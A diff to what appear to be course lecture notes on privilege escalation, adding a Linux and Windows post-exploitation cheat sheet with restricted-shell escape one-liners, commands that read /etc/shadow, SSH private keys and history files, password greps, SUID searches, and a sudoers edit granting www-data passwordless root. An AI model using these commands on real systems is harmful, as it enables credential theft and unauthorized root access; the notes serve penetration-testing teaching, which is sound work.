@@ -991,10 +991,344 @@ run
 ## Week 11@21 Jan 2023
 ## Lec
 - Privilege Escalation
-  - Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.
-    - [GTFOBins for Linux](https://gtfobins.github.io/)
+  - Manual Enumeration command
+    - Windows
+      ```bash
+      whoami
+      net user
+      systeminfo
+      systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+      ```
+  - [LOLBAS for Windows](https://lolbas-project.github.io/)
   - Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom functionality implemented through binaries, known-binary exploits, stored passwords, pass-the-hash.
-    - [LOLBAS for Windows](https://lolbas-project.github.io/)
+    - Linux
+      - Capabilities
+      - SUIDs/GUIDs
+      - cronjobs
+      - modifiable binaries running as root
+      - out-of-date binaries
+      - known-binary exploits
+      - history files.
+      - [GTFOBins for Linux](https://gtfobins.github.io/)
+      - Common Shell usage after reverse shell
+  
+      ```bash
+      ## Common Shell Escape Sequences: ==	
+      ## If commands are limited, you break out of the "jail" shell?	
+      python -c 'import pty;pty.spawn("/bin/bash")'	
+      echo os.system('/bin/bash')	
+      /bin/sh -i	
+        
+      ## Common Shell Escape Sequences:	
+      :!bash	vi, vim
+      :set shell=/bin/bash:shell	vi, vim
+      !bash	man, more, less
+      find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; 	find
+      awk 'BEGIN {system("/bin/bash")}'	awk
+      --interactive	nmap
+      echo "os.execute('/bin/sh')" > exploit.nse	nmap
+      sudo nmap --script=exploit.nse	nmap
+      perl -e 'exec "/bin/bash";'	Perl
+      ``` 
+      - Technique
+      ```bash
+      ## What's the distribution type? What version?	
+      cat /etc/issue	
+      cat /etc/*-release	
+      cat /etc/lsb-release	
+      cat /etc/redhat-release	
+   	
+      uname -n   // System hostname	
+      hostname // As above
+      ## What's the Kernel version? Is it 64-bit?	
+      cat /proc/version   	
+      uname -a	 
+      uname -r  // Kernel release	
+      uname -mrs 	
+      rpm -q kernel 	
+      dmesg | grep Linux	
+      ls /boot | grep vmlinuz-
+      cat /proc/cpuinfo   // CPU information
+
+      ## What can be learnt from the environmental variables? 
+      cat /etc/profile	
+      cat /etc/bashrc	
+      cat ~/.bash_profile	
+      cat ~/.bashrc	
+      cat ~/.bash_logout	
+      env	
+      set	
+
+      ## Is there a printer? 
+      lpstat -a	
+
+      ## Users & Groups: 
+      cat /etc/passwd  	
+      cat /etc/group   # List all groups on the system	
+      cat /etc/shadow  # Show user hashes – Privileged command	
+      grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' #List all super user accounts	
+      finger   #Users currently logged in	
+      pinky   # As above	
+      users  # As above	
+      who -a # As above	
+      w   # Who is currently logged in and what they’re doing	
+      last   # Listing of last logged on users	
+      lastlog   # Information on when all users last logged in	
+      lastlog --user root # Information on when the specified user last logged in
+
+      # User & Privilege Information: 
+      whoami 	
+      id 	
+      cat /etc/sudoers  # Who’s allowed to do what as root – Privileged command	
+      sudo -l  # Can the current user perform anything as root	
+      cat /etc/passwd | cut -d:    # List of users	
+      grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users	
+      awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users	
+      cat /etc/sudoers	
+
+      ## What has the user being doing? Is there any password in plain text? What have they been edting?	
+      cat ~/.bash_history	
+      cat ~/.nano_history	
+      cat ~/.atftp_history	
+      cat ~/.mysql_history 	
+      cat ~/.php_history	
+
+      ## What user information can be found? 	
+      cat ~/.bashrc	
+      cat ~/.profile	
+      cat /var/mail/root	
+      cat /var/spool/mail/root
+
+      ## Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!	
+      ps aux | grep root	
+      ps -ef | grep root
+
+      ## What applications are installed? What version are they? Are they currently running?	
+      ls -alh /usr/bin/	
+      ls -alh /sbin/	
+      dpkg -l	
+      rpm -qa	
+      ls -alh /var/cache/apt/archivesO	
+      ls -alh /var/cache/yum/ 	
+
+      ## Environmental Information: ==	
+      env  # Display environmental variables	
+      set  # As above	
+      echo $PATH  # Path information	
+      history # Displays  command history of current user	
+      cat /etc/profile # Display default system variables
+
+      ## Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached? 
+      cat /etc/syslog.conf 	
+      cat /etc/chttp.conf	
+      cat /etc/lighttpd.conf	
+      cat /etc/cups/cupsd.conf 	
+      cat /etc/inetd.conf 	
+      cat /etc/apache2/apache2.conf	
+      cat /etc/my.conf	
+      cat /etc/httpd/conf/httpd.conf	
+      cat /opt/lampp/etc/httpd.conf	
+      ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
+      ps aux | grep root  #View services running as root
+      cat /etc/inetd.conf  # List services managed by inetd	
+      cat /etc/xinetd.conf # As above for xinetd	
+
+      ## Installed programs 
+      dpkg -l # Installed packages (Debian)	
+      rpm -qa # Installed packages (Red Hat)	
+      sudo -V # Sudo version – does an exploit exist?	
+      httpd -v # Apache version	
+      apache2 -v # As above	
+      apache2ctl (or apachectl) -M # List loaded Apache modules	
+      mysql --version # Installed MYSQL version details	
+      perl -v #Installed Perl version details	
+      java -version # Installed Java version details	
+      python --version # Installed Python version details	
+      ruby -v # Installed Ruby version details	
+      find / -name %program_name% 2>/dev/null #(i.e. nc, netcat, wget, nmap etc) Locate ‘useful’ programs (netcat, wget etc)	
+      which %program_name% # (i.e. nc, netcat, wget, nmap etc) As above	
+
+      ## SH info ? 
+      ## Can private-key information be found? 	
+      cat ~/.ssh/authorized_keys	
+      cat ~/.ssh/identity.pub	
+      cat ~/.ssh/identity	
+      cat ~/.ssh/id_rsa.pub	
+      cat ~/.ssh/id_rsa	
+      cat ~/.ssh/id_dsa.pub	
+      cat ~/.ssh/id_dsa	
+      cat /etc/ssh/ssh_config	
+      cat /etc/ssh/sshd_config	
+      cat /etc/ssh/ssh_host_dsa_key.pub	
+      cat /etc/ssh/ssh_host_dsa_key	
+      cat /etc/ssh/ssh_host_rsa_key.pub	
+      cat /etc/ssh/ssh_host_rsa_key	
+      cat /etc/ssh/ssh_host_key.pub	
+      cat /etc/ssh/ssh_host_key	
+
+      ## Jobs/Tasks:	
+      crontab -l -u %username% # Display scheduled jobs for the specified user – Privileged command	
+      ls -la /etc/cron* # Scheduled jobs overview (hourly, daily, monthly etc)	
+      ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null # What can ‘others’ write in /etc/cron* directories	
+      ls -alh /var/spool/cron	
+      ls -al /etc/ | grep cron	
+      cat /etc/cron*	
+      cat /etc/at.allow	
+      cat /etc/at.deny	
+      cat /etc/cron.allow	
+      cat /etc/cron.deny	
+      cat /etc/crontab	
+      ls -alh  /etc/cron.daily	
+      ls -alh  /etc/cron.weekly	
+      ls -alh  /etc/cron.monthly	
+      cat /etc/anacrontab	
+      cat /var/spool/cron/crontabs/root
+
+      ## Interesting Files: 
+      find /home –name .rhosts -print 2>/dev/null # Find rhost config files	
+      ls -ahlR /root/     # See if you can access other user directories to find interesting files – Privileged command	
+      cat ~/.bash_history # Show the current users’ command history	
+      ls -la ~/._history # Show the current users’ various history files	
+      ls -la ~/.ssh/ Check # for interesting ssh files in the current users’ directory	
+      ls -la /usr/sbin/in.* # Check Configuration of inetd services	
+      find /var/log -type f -exec ls -la {} ; 2>/dev/null # List files in specified directory (/var/log)	
+      find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null # List .log files in specified directory (/var/log)	
+      find /etc/ -maxdepth 1 -name .conf -type f -exec ls -la {} ; 2>/dev/null # List .conf files in /etc (recursive 1 level)	
+      ls -la /etc/.conf # As above	
+      lsof -i -n  # List open files (output will depend on account privileges)	
+      lsof -u root  # lists all open files and processes by user root
+
+      ## Which configuration files can be written in /etc/? Able to reconfigure a service?	
+      ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone	
+      ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner	
+      ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group	
+      ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
+      find /etc/ -readable -type f 2>/dev/null            # Anyone	
+      find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
+
+      ## Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm	
+      find / -writable -type d 2>/dev/null        # world-writeable folders	
+      find / -perm -222 -type d 2>/dev/null      # world-writeable folders	
+      find / -perm -o+w -type d 2>/dev/null    # world-writeable folders	
+      find / -perm -o+x -type d 2>/dev/null    # world-executable folders	        
+      find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders	
+
+      ## Any "problem" files? Word-writeable, "nobody" files	
+      find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files	
+      find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
+      ## What sensitive files can be found? 	
+      cat /etc/passwd	
+      cat /etc/group	
+      cat /etc/shadow	
+      ls -alh /var/mail/
+
+      ## Anything "interesting" in the home directorie(s)? If it's possible to access	
+      ls -ahlR /root/	
+      ls -ahlR /home/
+
+      ## Any settings/files (hidden) on website? Any settings file with database information?	
+      ls -alhR /var/www/	
+      ls -alhR /srv/www/htdocs/ 	
+      ls -alhR /usr/local/www/apache22/data/	
+      ls -alhR /opt/lampp/htdocs/ 	
+      ls -alhR /var/www/html/	
+
+      ## Is there anything in the log file(s) (Could help with "Local File Includes"!)	
+      cat /etc/httpd/logs/access_log	
+      cat /etc/httpd/logs/access.log	
+      cat /etc/httpd/logs/error_log	
+      cat /etc/httpd/logs/error.log	
+      cat /var/log/apache2/access_log	
+      cat /var/log/apache2/access.log	
+      cat /var/log/apache2/error_log	
+      cat /var/log/apache2/error.log	
+      cat /var/log/apache/access_log	
+      cat /var/log/apache/access.log	
+      cat /var/log/auth.log	
+      cat /var/log/chttp.log	
+      cat /var/log/cups/error_log	
+      cat /var/log/dpkg.log	
+      cat /var/log/faillog	
+      cat /var/log/httpd/access_log	
+      cat /var/log/httpd/access.log	
+      cat /var/log/httpd/error_log	
+      cat /var/log/httpd/error.log	
+      cat /var/log/lastlog	
+      cat /var/log/lighttpd/access.log	
+      cat /var/log/lighttpd/error.log	
+      cat /var/log/lighttpd/lighttpd.access.log	
+      cat /var/log/lighttpd/lighttpd.error.log	
+      cat /var/log/messages	
+      cat /var/log/secure	
+      cat /var/log/syslog	
+      cat /var/log/wtmp	
+      cat /var/log/xferlog	
+      cat /var/log/yum.log	
+      cat /var/run/utmp	
+      cat /var/webmin/miniserv.log	
+      cat /var/www/logs/access_log	
+      cat /var/www/logs/access.log	
+      ls -alh /var/lib/dhcp3/	
+      ls -alh /var/log/postgresql/	
+      ls -alh /var/log/proftpd/	
+      ls -alh /var/log/samba/	
+      # auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp	
+
+      ## Search for specific strings inside a file	
+      file ./somefile   ## file info	
+      strings ./*.txt | grep password	
+      find / -name “*.log” |xargs grep -i pass	
+        
+      grep -l -i pass /var/log/*.log 2>/dev/null	
+      find / -maxdepth 10 -name *.conf -type f | grep -Hn pass; 2>/dev/null # searches for the string 'password' and output the line number	
+      find / -maxdepth 10 -name *etc* -type f | grep -Hn pass; 2>/dev/null  # as above, but in *etc*	
+      grep -l -i pass /var/log/*.log 2>/dev/null # Check log files for keywords (‘pass’ in this example) and show positive matches	
+      find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null # Find .conf files (recursive 4 levels) and output line number where the word password is located	
+      grep -i user [filename]	
+      grep -i pass [filename]	
+      grep -C 5 "password" [filename]	
+      find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla 	
+      hexeditor ./file	
+      objdump -D -M intel ./file	
+      objdump -D -M x86-64 ./file >> dump64.file	
+        
+      cat /var/apache2/config.inc	
+      cat /var/lib/mysql/mysql/user.MYD 	
+      cat /root/anaconda-ks.cfg	
+        
+      find / -name "network-secret.txt"	
+      locate "network-secret.txt"	
+
+      ## What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID	
+      find / -perm -u=s -type f 2>/dev/null     #Find FILES that have the sticky bit set. 	
+      find / -perm -1000 -type d 2>/dev/null    # Find DIRECTORIES w/ Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here	
+      find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.	
+      find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.	
+      find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID	
+      for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)	
+
+      ## find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)	
+      find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 	
+        
+      ## Where can be written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm	
+      find / -writable -type d 2>/dev/null        # world-writeable folders	
+      find / -perm -222 -type d 2>/dev/null      # world-writeable folders	
+      find / -perm -o+w -type d 2>/dev/null    # world-writeable folders	
+      find / -perm -o+x -type d 2>/dev/null    # world-executable folders	
+      find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders	
+        
+      ## Any "problem" files? Word-writeable, "nobody" files	
+      find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files	
+      find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files	
+
+      ## Edit sudoers 
+      # you should upgrde tty before edit sudoers 
+      nano /etc/sudoers
+      # User privilege specification 
+      root    ALL=(ALL:ALL) ALL
+      www-data ALL=(ALL:ALL) NOPASSWD:ALL        
+      ```   
 
 - นักศึกษากลุ่มที่ 7 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
   
